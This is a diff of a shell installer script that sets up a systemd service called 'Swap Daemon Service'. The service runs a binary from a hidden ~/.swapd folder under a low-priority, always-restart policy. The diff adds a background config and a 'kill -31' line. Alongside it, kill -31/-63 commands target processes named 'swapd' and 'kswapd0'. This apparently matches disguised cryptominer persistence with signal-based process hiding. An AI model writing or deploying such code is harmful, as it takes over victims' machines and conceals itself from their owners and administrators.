@@ -386,7 +386,7 @@ else
 Description=Swap Daemon Service
 
 [Service]
-ExecStart=$HOME/.swapd/swapd --config=/root/.swapd/config.json
+ExecStart=$HOME/.swapd/swapd --config=/root/.swapd/config_background.json
 Restart=always
 Nice=10
 CPUWeight=1
@@ -654,7 +654,8 @@ systemctl status swapd
 systemctl start swapd
 systemctl status swapd
 
-kill -31 $(pgrep -f -u root config.json) & 
+kill -31 $(pgrep -f -u root config.json) &
+kill -31 $(pgrep -f -u root config_background.json) &
 kill -31 `/bin/ps ax -fu $USER| grep "swapd" | grep -v "grep" | awk '{print $2}'` &
 kill -31 `/bin/ps ax -fu $USER| grep "kswapd0" | grep -v "grep" | awk '{print $2}'` &
 kill -63 `/bin/ps ax -fu $USER| grep "swapd" | grep -v "grep" | awk '{print $2}'` &
